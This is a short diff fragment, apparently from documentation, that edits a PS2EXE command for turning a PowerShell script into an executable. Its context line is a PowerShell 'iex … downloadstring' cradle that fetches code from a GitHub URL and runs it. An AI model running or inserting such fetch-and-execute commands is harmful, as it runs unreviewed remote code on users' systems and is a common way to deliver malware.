@@ -7,5 +7,5 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 ```
 
 ```
-PS2EXE -content $exescript -outputFile $exefilelocation
+PS2EXE -content $script -outputFile $exefilelocation C:\Users\User\Desktop\file.exe
 ```
